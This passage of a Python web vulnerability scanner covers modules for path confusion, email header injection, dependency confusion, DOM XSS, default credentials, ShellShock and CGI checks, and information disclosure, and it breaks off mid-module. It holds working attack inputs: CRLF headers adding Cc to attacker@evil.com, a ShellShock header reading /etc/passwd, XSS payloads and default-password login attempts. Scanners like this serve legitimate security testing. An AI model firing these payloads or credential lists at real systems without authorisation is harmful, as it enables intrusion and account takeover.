                             f"GET {test_url} → 200 with protected content",
                             8.1, f"Bypass pattern '{pattern}' on {ppath}")
                        break
            except Exception:
                pass

    # Windows device name check
    win_devices = ["con", "prn", "aux", "nul", "com1", "lpt1"]
    for dev in win_devices:
        test_url = f"{base}/{dev}"
        try:
            r = rget(test_url, timeout=3)
            if r.status_code == 200 and r.elapsed.total_seconds() > 2.0:
                _add("Windows Device Name in Path (Potential DoS)", "Medium",
                     "path_norm", test_url, "A05:2021", "CWE-400",
                     f"Request to Windows device name '{dev}' causes delay → "
                     "server may be Windows-based; device name access can cause DoS.",
                     f"GET /{dev} → 200 with {r.elapsed.total_seconds():.1f}s delay",
                     5.4, f"Windows device: {dev}")
        except Exception:
            pass

    # Reverse proxy path confusion: /app/../target_path
    proxy_paths = ["/app", "/api", "/proxy", "/web", "/service"]
    for pp in proxy_paths[:3]:
        for ppath in blocked[:2]:
            confusion_url = f"{base}{pp}/..{ppath}"
            try:
                r = rget(confusion_url, allow_redirects=False)
                if r.status_code == 200 and len(r.text) > 200:
                    _add("Reverse Proxy Path Confusion", "High",
                         "path_norm", confusion_url, "A01:2021", "CWE-22",
                         f"Path {pp}/..{ppath} bypasses access control via reverse proxy path confusion → "
                         "proxy normalizes path differently from backend.",
                         f"GET {confusion_url} → 200",
                         7.5, f"Proxy confusion: {pp}/..{ppath}")
            except Exception:
                pass

    _module_done("path_norm")


# ═══════════════════════════════════════════════════════════════
#  MODULE 45 — Email Header Injection
# ═══════════════════════════════════════════════════════════════
def email_injection_scan(url):
    if _module_skip("email_inject"): return
    section("MODULE 45 — Email Header Injection","📧")

    # Find forms with email/name/subject/message fields
    email_forms = []
    contact_paths = [url, url.rstrip("/")+"/contact", url.rstrip("/")+"/contact-us",
                     url.rstrip("/")+"/feedback", url.rstrip("/")+"/support",
                     url.rstrip("/")+"/help", url.rstrip("/")+"/message",
                     url.rstrip("/")+"/email", url.rstrip("/")+"/mail"]

    for cpath in contact_paths[:5]:
        try:
            r = rget(cpath)
            if not BS4:
                break
            soup = BeautifulSoup(r.text, "html.parser")
            for form in soup.find_all("form"):
                action = form.get("action","")
                form_url = urljoin(url, action) if action else cpath
                fields = {}
                for inp in form.find_all(["input","textarea"]):
                    n = inp.get("name","")
                    t = inp.get("type","text")
                    if n and t not in ("submit","button","hidden","file","checkbox","radio"):
                        fields[n] = inp.get("value","test@example.com")
                        if t == "email" or any(x in n.lower() for x in ["email","mail"]):
                            fields[n] = "test@example.com"
                        elif any(x in n.lower() for x in ["name","first","last"]):
                            fields[n] = "TestUser"
                        elif any(x in n.lower() for x in ["subject","topic"]):
                            fields[n] = "Test Subject"
                        elif any(x in n.lower() for x in ["message","body","content","text"]):
                            fields[n] = "Test message body."
                if fields:
                    email_forms.append((form_url, fields))
        except Exception:
            pass

    if not email_forms:
        info("No email/contact forms found for injection testing")
        _module_done("email_inject"); return

    # CRLF / header injection payloads for email fields
    inject_payloads = [
        ("CRLF CC injection", "victim@example.com\r\nCc:attacker@evil.com"),
        ("CRLF BCC injection", "victim@example.com\r\nBcc:attacker@evil.com"),
        ("CRLF Subject injection", "victim@example.com\r\nSubject:Injected Subject"),
        ("Newline injection", "victim@example.com\nCc:attacker@evil.com"),
        ("CRLF From injection", "victim@example.com\r\nFrom:spoof@evil.com"),
        ("Multiple headers", "victim@example.com%0d%0aCc:a@b.com%0d%0aBcc:c@d.com"),
        ("SMTP command injection", "victim@example.com\r\nDATA\r\nSUBJECT:injected"),
    ]

    for form_url, fields in email_forms[:3]:
        # Find email-type fields
        email_fields = [n for n in fields
                       if any(x in n.lower() for x in ["email","mail","to","from","reply"])]
        subj_fields  = [n for n in fields
                       if any(x in n.lower() for x in ["subject","topic","title"])]
        test_fields  = email_fields or subj_fields or list(fields.keys())[:2]

        for field_name in test_fields[:2]:
            for payload_name, payload_val in inject_payloads[:4]:
                test_data = dict(fields)
                test_data[field_name] = payload_val
                try:
                    r = rpost(form_url, data=test_data)
                    body = r.text.lower()
                    # Success indicators (form accepted injection payload)
                    if r.status_code == 200 and any(
                        x in body for x in ["sent","thank","success","received","submitted",
                                            "message","delivered"]):
                        _add(f"Email Header Injection — {payload_name}", "High",
                             "email_inject", form_url, "A03:2021", "CWE-93",
                             f"Form field '{field_name}' accepted CRLF/header injection payload → "
                             "attacker can inject Cc/Bcc headers to redirect emails or perform spam relay.",
                             f"POST {form_url} field={field_name} val='{payload_val[:40]}' → success response",
                             7.5, f"{payload_name} via field: {field_name}")
                except Exception:
                    pass

    _module_done("email_inject")


# ═══════════════════════════════════════════════════════════════
#  MODULE 46 — Dependency Confusion
# ═══════════════════════════════════════════════════════════════
def dependency_confusion_scan(url):
    if _module_skip("dep_confusion"): return
    section("MODULE 46 — Dependency Confusion","📦")
    parsed = urlparse(url)
    base   = f"{parsed.scheme}://{parsed.netloc}"
    domain = parsed.hostname or ""

    # Collect package names from common manifest files
    manifest_paths = [
        "/package.json", "/package-lock.json", "/yarn.lock",
        "/requirements.txt", "/Pipfile", "/setup.py",
        "/composer.json", "/Gemfile", "/go.mod",
        "/pom.xml", "/build.gradle", "/.npmrc",
        "/npm-shrinkwrap.json",
    ]

    found_packages = []
    for mpath in manifest_paths:
        try:
            r = rget(base + mpath)
            if r.status_code != 200 or len(r.text) < 50:
                continue
            body = r.text
            vlog(f"Manifest found: {mpath}")

            # npm: extract @scope/name or plain name packages
            if "package.json" in mpath or "yarn.lock" in mpath:
                # Scoped packages: @company/pkg
                scoped = re.findall(r'"(@[a-z0-9_.-]+/[a-z0-9_.-]+)"', body)
                plain  = re.findall(r'"([a-z][a-z0-9_.-]{3,})":\s*"[\^~]?\d', body)
                found_packages.extend([("npm", p) for p in scoped + plain[:10]])

            # Python
            if "requirements.txt" in mpath or "Pipfile" in mpath:
                pkgs = re.findall(r'^([a-zA-Z][a-zA-Z0-9_.-]+)', body, re.MULTILINE)
                found_packages.extend([("pypi", p) for p in pkgs[:10]])

            # Look for internal package name patterns
            company_name = domain.split(".")[0] if domain else "company"
            internal_patterns = [
                rf'"{re.escape(company_name)}-\w+"',
                r'"internal-\w+"', r'"private-\w+"', r'"corp-\w+"',
                r'"@internal/\w+"', r'"@private/\w+"',
            ]
            for pat in internal_patterns:
                hits = re.findall(pat, body)
                if hits:
                    pkg_names = [h.strip('"') for h in hits]
                    _add("Dependency Confusion — Internal Package Names Exposed", "High",
                         "dep_confusion", base+mpath, "A06:2021", "CWE-427",
                         f"Package manifest exposes internal/private package names {pkg_names} → "
                         "attacker can publish a higher-versioned public package with same name to hijack installs.",
                         f"GET {mpath} → internal package names: {pkg_names}",
                         8.1, f"Internal packages in {mpath}: {pkg_names}")

        except Exception:
            pass

    if not found_packages:
        # Try to detect from page source (linked JS/CSS with version patterns)
        try:
            r = rget(url)
            js_refs = re.findall(r'src=["\']([^"\']+\.js)["\']', r.text)
            # Look for version-pinned CDN references that reveal package names
            cdn_pkgs = re.findall(r'(?:unpkg|jsdelivr|cdnjs)\.com/[^/]+/([a-z][a-z0-9_.-]+)@', r.text)
            if cdn_pkgs:
                good(f"CDN packages detected: {cdn_pkgs[:5]}")
                found_packages.extend([("npm", p) for p in cdn_pkgs[:5]])
        except Exception:
            pass

    if not found_packages:
        info("No package manifests or dependency info found")
        _module_done("dep_confusion"); return

    good(f"Packages found: {len(found_packages)} entries")

    # Check npm registry for scoped/private packages (public availability = squatting risk)
    checked = set()
    for pkg_type, pkg_name in found_packages[:15]:
        if pkg_name in checked or len(pkg_name) < 4:
            continue
        checked.add(pkg_name)

        # Check if name looks internal/private
        company_name = domain.split(".")[0] if domain else ""
        is_internal = any([
            company_name and company_name.lower() in pkg_name.lower(),
            pkg_name.startswith("@"),
            any(x in pkg_name.lower() for x in ["internal","private","corp","local","dev-"]),
        ])

        if pkg_type == "npm":
            try:
                r = rget(f"https://registry.npmjs.org/{quote(pkg_name)}",
                         headers={"Accept": "application/json"}, timeout=5)
                if r.status_code == 404 and is_internal:
                    _add(f"Dependency Confusion — npm Package '{pkg_name}' Not on Registry", "High",
                         "dep_confusion", url, "A06:2021", "CWE-427",
                         f"Internal npm package '{pkg_name}' not found on public registry → "
                         "attacker can publish package with same name and higher version to hijack installs.",
                         f"npm package '{pkg_name}' → registry 404 (claimable)",
                         8.1, f"Claimable npm package: {pkg_name}")
                elif r.status_code == 200 and is_internal:
                    try:
                        reg_data = r.json()
                        latest = reg_data.get("dist-tags",{}).get("latest","0.0.0")
                        _add(f"Dependency Confusion — Public Package Shadows Internal '{pkg_name}'", "Medium",
                             "dep_confusion", url, "A06:2021", "CWE-427",
                             f"Internal package '{pkg_name}' exists on public npm registry (v{latest}) → "
                             "if public version > internal version, installs may pull malicious public package.",
                             f"Internal pkg '{pkg_name}' found on npm registry at v{latest}",
                             6.1, f"Public shadow of internal package: {pkg_name}@{latest}")
                    except Exception:
                        pass
            except Exception:
                pass

    _module_done("dep_confusion")


# ═══════════════════════════════════════════════════════════════
#  MODULE 47 — DOM-based XSS (JavaScript Source/Sink Analysis)
# ═══════════════════════════════════════════════════════════════
def dom_xss_scan(url):
    if _module_skip("dom_xss"): return
    section("MODULE 47 — DOM-based XSS (Source/Sink Analysis)","🌐")

    # Dangerous sinks
    SINKS = [
        "innerHTML", "outerHTML", "document.write", "document.writeln",
        "eval(", "setTimeout(", "setInterval(", "Function(",
        "location.href", "location.assign", "location.replace",
        "window.location", "document.location",
        "insertAdjacentHTML", "$.html(", "$(", ".html(",
        "dangerouslySetInnerHTML",
    ]
    # Dangerous sources
    SOURCES = [
        "location.hash", "location.search", "location.href",
        "document.referrer", "document.URL", "document.documentURI",
        "window.name", "postMessage", "localStorage", "sessionStorage",
        "URLSearchParams", "history.pushState",
    ]

    # Collect all JS file URLs from the page
    js_urls = []
    try:
        r = rget(url)
        page_src = r.text

        # Inline script analysis
        inline_scripts = re.findall(r'<script[^>]*>(.*?)</script>', page_src, re.DOTALL | re.IGNORECASE)
        for script in inline_scripts[:10]:
            found_sources = [s for s in SOURCES if s in script]
            found_sinks   = [s for s in SINKS if s in script]
            if found_sources and found_sinks:
                _add("DOM XSS — Inline Script Source→Sink Chain", "High",
                     "dom_xss", url, "A03:2021", "CWE-79",
                     f"Inline script contains both dangerous sources {found_sources} and "
                     f"sinks {found_sinks} → potential DOM-based XSS if source flows to sink.",
                     f"Inline script: sources={found_sources}, sinks={found_sinks}",
                     7.5, f"Source→Sink: {found_sources[0]} → {found_sinks[0]}")

        # Collect external JS URLs
        js_srcs = re.findall(r'<script[^>]+src=["\']([^"\']+\.js(?:\?[^"\']*)?)["\']',
                             page_src, re.IGNORECASE)
        for src in js_srcs[:20]:
            full_url = urljoin(url, src)
            if urlparse(full_url).netloc == urlparse(url).netloc:
                js_urls.append(full_url)
    except Exception:
        pass

    # Analyze each same-origin JS file
    for js_url in js_urls[:10]:
        try:
            r = rget(js_url)
            script = r.text

            found_sources = [s for s in SOURCES if s in script]
            found_sinks   = [s for s in SINKS if s in script]

            if found_sources and found_sinks:
                # Check for common DOM XSS patterns
                patterns = [
                    # location.hash → innerHTML
                    (r'location\.hash', r'innerHTML\s*='),
                    (r'location\.search', r'document\.write\('),
                    (r'location\.href', r'eval\('),
                    (r'document\.referrer', r'innerHTML\s*='),
                    (r'postMessage', r'innerHTML\s*='),
                    (r'window\.name', r'innerHTML\s*='),
                    (r'URLSearchParams', r'innerHTML\s*='),
                    (r'location\.hash', r'location\.href\s*='),
                ]
                for src_pat, sink_pat in patterns:
                    if re.search(src_pat, script) and re.search(sink_pat, script):
                        src_match  = re.search(src_pat, script).group(0)
                        sink_match = re.search(sink_pat, script).group(0)
                        _add(f"DOM XSS — {src_match} → {sink_match[:20]}", "High",
                             "dom_xss", js_url, "A03:2021", "CWE-79",
                             f"JavaScript file contains DOM XSS pattern: source '{src_match}' "
                             f"flows to sink '{sink_match.strip()}' → attacker controls source to inject payload.",
                             f"JS: {js_url.split('/')[-1]}: {src_match} → {sink_match.strip()}",
                             7.5, f"DOM XSS: {src_match} → {sink_match.strip()}")
                        break  # one finding per file

                # hash-based payloads to test DOM XSS
                test_hashes = [
                    "#<img src=x onerror=alert(1)>",
                    "#javascript:alert(1)",
                    "#\"><script>alert(1)</script>",
                ]
                for h in test_hashes[:2]:
                    test_url_hash = url + h
                    try:
                        r2 = rget(test_url_hash)
                        if "alert(1)" in r2.text or "onerror" in r2.text:
                            _add("DOM XSS — Hash Payload Reflected Server-Side", "High",
                                 "dom_xss", test_url_hash, "A03:2021", "CWE-79",
                                 "URL fragment XSS payload reflected in server response (unusual) → "
                                 "server-side processing of hash enables DOM XSS via server reflection.",
                                 f"GET {url}{h} → payload in response body",
                                 7.5, "Hash payload server-reflected")
                    except Exception:
                        pass

            elif found_sinks:
                # Sinks present but no obvious sources — log as info
                vlog(f"JS sinks in {js_url.split('/')[-1]}: {found_sinks[:3]}")

        except Exception:
            pass

    # Test postMessage handler
    try:
        r = rget(url)
        if "addEventListener" in r.text and "message" in r.text:
            # Check if message data used in dangerous sink
            post_msg_sinks = re.findall(
                r'addEventListener\(["\']message["\'].*?(?:innerHTML|eval|write|location)',
                r.text, re.DOTALL)
            if post_msg_sinks:
                _add("DOM XSS — postMessage Handler with Dangerous Sink", "High",
                     "dom_xss", url, "A03:2021", "CWE-79",
                     "Page listens to 'message' event and passes data to dangerous sink → "
                     "Cross-Origin postMessage DOM XSS if origin not validated.",
                     f"addEventListener('message') → sink: {str(post_msg_sinks[0])[:60]}",
                     7.5, "postMessage → dangerous sink")
    except Exception:
        pass

    _module_done("dom_xss")


# ═══ MODULE 54 — DEFAULT CREDENTIALS SCANNER ════════════════════
def default_creds_scan(url):
    if _module_skip("default_creds"): info("Skipping Default Creds (already done)"); return
    section("MODULE 54 — DEFAULT CREDENTIALS SCANNER","🔑")

    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    # (path, method, cred_pairs, success_indicator, app_name)
    TARGETS = [
        # WordPress
        ("/wp-login.php", "POST",
         [("log=admin&pwd=admin&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
           "admin", "admin"),
          ("log=admin&pwd=password&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
           "admin", "password"),
          ("log=admin&pwd=123456&wp-submit=Log+In&redirect_to=%2Fwp-admin%2F&testcookie=1",
           "admin", "123456")],
         ["Dashboard", "wp-admin", "Howdy"], "WordPress"),

        # Apache Tomcat Manager
        ("/manager/html", "BASIC",
         [("tomcat", "tomcat"), ("admin", "admin"), ("admin", "s3cret"),
          ("tomcat", "s3cret"), ("admin", "password"), ("manager", "manager")],
         ["Tomcat Web Application Manager", "Applications"], "Apache Tomcat"),

        # Jenkins — probe /login (200/302), POST to /j_spring_security_check
        ("/login", "JENKINS",
         [("j_username=admin&j_password=admin&from=%2F&Submit=Sign+in",
           "admin", "admin"),
          ("j_username=admin&j_password=password&from=%2F&Submit=Sign+in",
           "admin", "password")],
         ["Dashboard", "Jenkins", "Build History"], "Jenkins"),

        # Grafana — uses JSON API, not form POST
        ("/api/login", "JSON",
         [('{"user":"admin","password":"admin"}', "admin", "admin"),
          ('{"user":"admin","password":"grafana"}', "admin", "grafana"),
          ('{"user":"admin","password":"Admin1234!"}', "admin", "Admin1234!")],
         ["\"message\":\"Logged in\"", "tokenId", "grafana_session"], "Grafana"),

        # phpMyAdmin — presence detection only (empty indicators = presence-only mode)
        # Post-login content (pma_navigation etc.) checked separately to avoid false positives
        ("/phpmyadmin/", "GET", [], [], "phpMyAdmin"),
        ("/phpmyadmin/index.php", "GET", [], [], "phpMyAdmin"),

        # Joomla
        ("/administrator/", "POST",
         [("username=admin&passwd=admin&option=com_login&task=login",
           "admin", "admin")],
         ["Joomla", "Control Panel", "mod_login"], "Joomla"),

        # Webmin
        ("/session_login.cgi", "POST",
         [("user=root&pass=root", "root", "root"),
          ("user=admin&pass=admin", "admin", "admin")],
         ["Webmin", "index.cgi", "System Information"], "Webmin"),

        # cPanel
        ("/login/?login_only=1", "POST",
         [("user=admin&pass=admin", "admin", "admin")],
         ["cPanel", "WHM", "cpanel_session"], "cPanel"),
    ]

    found_any = False

    for path, method, creds, indicators, app_name in TARGETS:
        target_url = base + path

        # Probe: check if path exists. For POST/JSON/BASIC targets a GET probe may return
        # 302 (redirect to login) or 405 (Method Not Allowed) — both mean the path exists.
        # Allow 200, 302, 401, 403, 405 as "path exists" signals.
        try:
            probe = rget(target_url, timeout=TIMEOUT, allow_redirects=False)
            if probe.status_code not in (200, 302, 301, 401, 403, 405):
                continue   # path doesn't exist on this server (404, 500, etc.)
        except Exception:
            continue

        if method == "GET":
            # For GET probes, re-fetch with redirects to get actual content
            try:
                probe = rget(target_url, timeout=TIMEOUT, allow_redirects=True)
            except Exception:
                continue
            # For empty indicators list — just detect presence (e.g. phpMyAdmin login page)
            if not indicators:
                # phpMyAdmin detected — report presence, cannot test no-auth without false positive
                PMA_LOGIN_INDICATORS = ["phpmyadmin", "pma_username", "pmalogo"]
                if any(ind in probe.text.lower() for ind in PMA_LOGIN_INDICATORS):
                    info(f"{app_name} detected at {path} — manual auth test recommended")
                    add("default_creds", {
                        "severity": "Info",
                        "title": f"{app_name} Admin Panel Detected at {path}",
                        "description": f"{app_name} login interface found at {target_url}. Automated credential testing skipped to avoid false positives — test manually.",
                        "recommendation": f"Ensure {app_name} requires strong credentials. Restrict access by IP. Disable {app_name} in production if not needed.",
                        "url": target_url,
                    })
                continue
            # Check if already accessible (no auth required) — post-login indicators only
            if any(ind.lower() in probe.text.lower() for ind in indicators):
                vuln(f"{app_name} admin panel accessible without authentication: {path}", "Critical")
                add("default_creds", {
                    "severity": "Critical",
                    "title": f"{app_name} Admin Panel Exposed (No Auth)",
                    "description": f"{app_name} administration interface at {target_url} is accessible without any authentication.",
                    "recommendation": f"Restrict access to {path} via IP whitelist or require authentication.",
                    "url": target_url,
                })
                found_any = True
            continue

        if method == "BASIC":
            for user, passwd in creds:
                try:
                    r = _sess.get(target_url, auth=(user, passwd), timeout=TIMEOUT)
                    if r.status_code == 200 and any(ind.lower() in r.text.lower() for ind in indicators):
                        vuln(f"{app_name} default credentials valid: {user}:{passwd}", "Critical")
                        add("default_creds", {
                            "severity": "Critical",
                            "title": f"{app_name} Default Credentials Work ({user}:{passwd})",
                            "description": f"HTTP Basic Auth at {target_url} accepted default credentials {user}:{passwd}.",
                            "recommendation": "Immediately change default credentials. Restrict admin path by IP. Disable remote management if not needed.",
                            "url": target_url,
                        })
                        found_any = True
                        break
                except Exception:
                    pass
            continue

        if method in ("POST", "JSON", "JENKINS"):
            for payload, user, passwd in creds:
                try:
                    if method == "JSON":
                        r = _sess.post(
                            target_url,
                            data=payload,
                            headers={"Content-Type": "application/json",
                                     "User-Agent": UA},
                            timeout=TIMEOUT,
                            allow_redirects=True,
                        )
                    elif method == "JENKINS":
                        # Jenkins: probe path is /login but POST target is the action URL
                        jenkins_post = base + "/j_spring_security_check"
                        r = _sess.post(
                            jenkins_post,
                            data=payload,
                            headers={"Content-Type": "application/x-www-form-urlencoded",
                                     "User-Agent": UA,
                                     "Referer": base + "/login"},
                            timeout=TIMEOUT,
                            allow_redirects=True,
                        )
                    else:
                        r = _sess.post(
                            target_url,
                            data=payload,
                            headers={"Content-Type": "application/x-www-form-urlencoded",
                                     "User-Agent": UA},
                            timeout=TIMEOUT,
                            allow_redirects=True,
                        )
                    # Success = we landed on a dashboard indicator
                    if any(ind.lower() in r.text.lower() for ind in indicators):
                        # Also confirm it's not the login page itself
                        if "invalid" not in r.text.lower() and "incorrect" not in r.text.lower():
                            vuln(f"{app_name} default credentials valid: {user}:{passwd} at {path}", "Critical")
                            add("default_creds", {
                                "severity": "Critical",
                                "title": f"{app_name} Default Credentials Work ({user}:{passwd})",
                                "description": f"Login at {target_url} accepted default credentials {user}:{passwd} and returned admin dashboard indicators.",
                                "recommendation": "Immediately change default credentials. Enable account lockout. Restrict admin paths by IP address.",
                                "url": target_url,
                            })
                            found_any = True
                            break
                except Exception:
                    pass

    if not found_any:
        good("No default credentials accepted on common admin panels")
    _module_done("default_creds")


# ═══ MODULE 55 — SERVER HARDENING & CGI SCAN ════════════════════
def server_hardening_scan(url):
    if _module_skip("srv_hardening"): info("Skipping Server Hardening (already done)"); return
    section("MODULE 55 — SERVER HARDENING & CGI SCAN","🔩")

    parsed = urlparse(url)
    base = f"{parsed.scheme}://{parsed.netloc}"

    # 1. WebDAV detection
    try:
        r_opt = _sess.request("OPTIONS", url, timeout=TIMEOUT,
                              headers={"User-Agent": UA})
        allow = r_opt.headers.get("Allow","") + r_opt.headers.get("DAV","")
        if "PROPFIND" in allow or "DAV" in allow or r_opt.headers.get("DAV"):
            vuln("WebDAV enabled — file operations may be possible", "High")
            add("srv_hardening", {
                "severity": "High",
                "title": "WebDAV Enabled",
                "description": "WebDAV is enabled on this server. Attackers may browse the directory structure, upload files, or overwrite existing files.",
                "recommendation": "Disable WebDAV unless explicitly required. Restrict with IP-based ACL if needed.",
                "url": url,
            })
        # PUT method check
        if "PUT" in allow:
            vuln("HTTP PUT method enabled — arbitrary file upload possible", "Critical")
            add("srv_hardening", {
                "severity": "Critical",
                "title": "HTTP PUT Method Enabled",
                "description": "The server allows HTTP PUT requests which may allow attackers to upload arbitrary files including web shells.",
                "recommendation": "Disable PUT method in web server configuration unless required by application logic.",
                "url": url,
            })
    except Exception: pass

    # 2. PHP info pages
    PHP_INFO_PATHS = [
        "/phpinfo.php", "/info.php", "/test.php", "/php_info.php",
        "/phptest.php", "/_info.php", "/phps.php",
    ]
    for path in PHP_INFO_PATHS:
        try:
            r = rget(base + path, timeout=TIMEOUT)
            if r.status_code == 200 and "phpinfo()" in r.text and "PHP Version" in r.text:
                vuln(f"PHP info page exposed: {path}", "High")
                add("srv_hardening", {
                    "severity": "High",
                    "title": f"PHP Info Page Exposed ({path})",
                    "description": f"phpinfo() at {base + path} reveals PHP version, loaded modules, configuration, file paths, and environment variables.",
                    "recommendation": "Remove phpinfo() files from production servers immediately.",
                    "url": base + path,
                })
                break
        except Exception: pass

    # 3. Apache server-status / server-info
    for path, label in [("/server-status", "Apache server-status"), ("/server-info", "Apache server-info")]:
        try:
            r = rget(base + path, timeout=TIMEOUT)
            if r.status_code == 200:
                indicators = ["Apache Server Status", "Server Version", "Total Accesses", "Server Information"]
                if any(ind in r.text for ind in indicators):
                    vuln(f"{label} exposed at {path}", "Medium")
                    add("srv_hardening", {
                        "severity": "Medium",
                        "title": f"{label} Exposed",
                        "description": f"{label} page at {base + path} reveals real-time request stats, worker status, server version, and loaded modules.",
                        "recommendation": f"Restrict access to {path} by IP or disable it entirely via Apache configuration.",
                        "url": base + path,
                    })
        except Exception: pass

    # 4. CGI ShellShock
    SHELLSHOCK_PATHS = [
        "/cgi-bin/test.cgi", "/cgi-bin/test-cgi", "/cgi-bin/status",
        "/cgi-bin/printenv", "/cgi-bin/environment.cgi",
    ]
    SS_HEADER = {"User-Agent": "() { :;}; echo; echo; /bin/cat /etc/passwd",
                 "Referer": "() { :;}; echo; echo; /bin/cat /etc/passwd"}
    for path in SHELLSHOCK_PATHS:
        try:
            r = _sess.get(base + path, headers=SS_HEADER, timeout=TIMEOUT)
            if r.status_code == 200 and ("root:x:" in r.text or "root:0:" in r.text):
                vuln(f"ShellShock (CVE-2014-6271) confirmed at {path}!", "Critical")
                add("srv_hardening", {
                    "severity": "Critical",
                    "title": "ShellShock CGI Vulnerability (CVE-2014-6271)",
                    "description": f"The CGI script at {base + path} is vulnerable to ShellShock. Remote code execution is confirmed via /bin/cat /etc/passwd output.",
                    "recommendation": "Update bash to a patched version immediately. Disable vulnerable CGI scripts. Apply server patches.",
                    "url": base + path,
                })
                break
            elif r.status_code == 200 and "cgi" in r.text.lower():
                warn(f"CGI script exists at {path} — ShellShock check inconclusive")
        except Exception: pass

    # 5. Backup file deep scan
    BACKUP_EXTS = [".bak", ".old", ".orig", ".save", ".swp", ".tmp", "~", ".backup",
                   ".copy", ".dist", ".1", ".2"]
    # Try common filenames with backup extensions
    COMMON_FILES = ["index", "config", "configuration", "settings", "database",
                    "db", "admin", "login", "setup", "install", "web", "app"]
    _found_backup = threading.Event()

    def _check_backup(fname, ext):
        if _found_backup.is_set(): return
        bpath = f"/{fname}{ext}"
        try:
            r = rget(base + bpath, timeout=5)
            if r.status_code == 200 and len(r.content) > 50:
                # Quick check that it's not just a 200 for everything
                r404 = rget(base + "/thisfiledoesnotexist_xyz123.bak", timeout=4)
                if r404.status_code == 200:
                    return  # soft 404
                _found_backup.set()
                vuln(f"Backup file accessible: {bpath}", "High")
                add("srv_hardening", {
                    "severity": "High",
                    "title": f"Backup File Exposed ({bpath})",
                    "description": f"A backup copy of a source file is publicly accessible at {base + bpath}. This may contain database credentials, API keys, or application logic.",
                    "recommendation": "Remove all backup files from web-accessible directories. Configure web server to deny access to backup extensions.",
                    "url": base + bpath,
                })
        except Exception: pass

    tasks = [(f, e) for f in COMMON_FILES for e in BACKUP_EXTS]
    with ThreadPoolExecutor(max_workers=15) as ex:
        futs = [ex.submit(_check_backup, f, e) for f, e in tasks]
        for ft in as_completed(futs): _pass(ft)

    # 6. IIS short filename (tilde) enumeration
    try:
        r_tilde = rget(base + "/a~1/a.aspx", timeout=min(TIMEOUT, 5))
        r_normal = rget(base + "/abcdefghijklmnop.aspx", timeout=min(TIMEOUT, 5))
        if r_tilde.status_code == 400 and r_normal.status_code == 404:
            warn("IIS short filename enumeration (tilde ~) may be possible")
            add("srv_hardening", {
                "severity": "Low",
                "title": "IIS Short Filename Enumeration (Tilde ~)",
                "description": "IIS may be vulnerable to 8.3 filename enumeration via the tilde (~) character, allowing attackers to discover hidden files and directories.",
                "recommendation": "Disable 8.3 filename generation on NTFS volumes: 'fsutil behavior set disable8dot3 1'. Apply IIS patches.",
                "url": base + "/a~1/",
            })
    except Exception: pass

    good("Server hardening scan complete")
    _module_done("srv_hardening")


# ═══ MODULE 56 — INFORMATION DISCLOSURE ═════════════════════════
def info_disclosure_scan(url):
    if _module_skip("info_disclosure"): info("Skipping Info Disclosure (already done)"); return
    section("MODULE 56 — INFORMATION DISCLOSURE","📰")

    # Patterns for private IPs
    PRIVATE_IP_RE = re.compile(
        r'\b(10\.\d{1,3}\.\d{1,3}\.\d{1,3}'
        r'|172\.(1[6-9]|2\d|3[01])\.\d{1,3}\.\d{1,3}'
        r'|192\.168\.\d{1,3}\.\d{1,3}'
        r'|127\.\d{1,3}\.\d{1,3}\.\d{1,3})\b'
    )

    # Stack trace / debug patterns
    STACK_PATTERNS = [
        (r'Traceback \(most recent call last\)',              "Python stack trace"),
        (r'File ".*\.py", line \d+',                         "Python file path disclosure"),
        (r'at [\w\.]+\([\w\.]+\.java:\d+\)',                 "Java stack trace"),
        (r'in [\w/\\]+\.php on line \d+',                    "PHP error with file path"),
        (r'ErrorException.*app[/\\]',                        "Laravel/PHP exception"),
        (r'ActiveRecord::',                                   "Ruby on Rails error"),
        (r'Django.*Traceback',                                "Django debug page"),
        (r'Microsoft.*OLE DB.*error',                        "MSSQL OLE DB error"),
        (r'ORA-\d{5}:',                                      "Oracle DB error"),
        (r'PostgreSQL.*ERROR',                               "PostgreSQL error"),
        (r'mysql_fetch_array\(\)',                           "MySQL function exposure"),
        (r'You have an error in your SQL syntax',            "MySQL SQL error"),
        (r'SQLSTATE\[\w+\]',                                 "PDO SQL error"),
        (r'Microsoft VBScript runtime error',                "VBScript runtime error"),
        (r'System\.Web\.HttpUnhandledException',             "ASP.NET unhandled exception"),
    ]

    # Debug mode indicators
    DEBUG_PATTERNS = [
        (r'APP_DEBUG\s*=\s*true',                "Laravel debug mode on"),
        (r'DEBUG\s*=\s*True',                    "Django debug mode on"),
        (r'display_errors\s*=\s*On',             "PHP display_errors On"),
        (r'"debug"\s*:\s*true',                  "JSON debug flag"),
        (r'X-Debug-Token',                       "Symfony debug toolbar"),
        (r'Whoops!.*pretty error handler',       "Whoops! debug handler"),
    ]

    # HTML comment sensitive patterns
    COMMENT_PATTERNS = [
        (r'<!--.*password.*-->',    "Password in HTML comment"),
        (r'<!--.*passwd.*-->',      "Password in HTML comment"),
        (r'<!--.*secret.*-->',      "Secret in HTML comment"),
        (r'<!--.*api.?key.*-->',    "API key in HTML comment"),
        (r'<!--.*token.*-->',       "Token in HTML comment"),
        (r'<!--.*TODO.*-->',        "TODO comment exposed"),
        (r'<!--.*FIXME.*-->',       "FIXME comment exposed"),
        (r'<!--.*admin.*-->',       "Admin note in HTML comment"),
    ]

    # PII patterns
    PII_PATTERNS = [
        (r'\b4[0-9]{12}(?:[0-9]{3})?\b',               "Visa card number"),
        (r'\b5[1-5][0-9]{14}\b',                        "MasterCard number"),
        (r'\b3[47][0-9]{13}\b',                         "Amex card number"),
        (r'\b\d{3}-\d{2}-\d{4}\b',                     "SSN pattern (US)"),
    ]

    try:
        r = rget(url, timeout=TIMEOUT)
        body = r.text
        headers_str = str(r.headers)

        # 1. Private IP in response
        priv_ips = set(PRIVATE_IP_RE.findall(body + headers_str))
        # Filter common false positives:
        # 127.x in body is often a localhost reference in docs/config examples — keep only if in headers
        priv_ips_body    = {ip for ip in PRIVATE_IP_RE.findall(body)         if not ip.startswith("127.")}
        priv_ips_headers = set(PRIVATE_IP_RE.findall(headers_str))   # all including 127.x in headers
        priv_ips = priv_ips_body | priv_ips_headers
        if priv_ips:
            for ip in priv_ips:
                warn(f"Private IP disclosed: {ip}")
            add("info_disclosure", {
                "severity": "Medium",
                "title": f"Private IP Address Disclosed ({', '.join(priv_ips)})",
                "description": f"Internal IP address(es) {', '.join(priv_ips)} found in HTTP response. Reveals internal network topology.",
                "recommendation": "Configure web server and application to strip internal IP addresses from responses and headers.",
                "url": url,
            })

        # 2. Stack traces
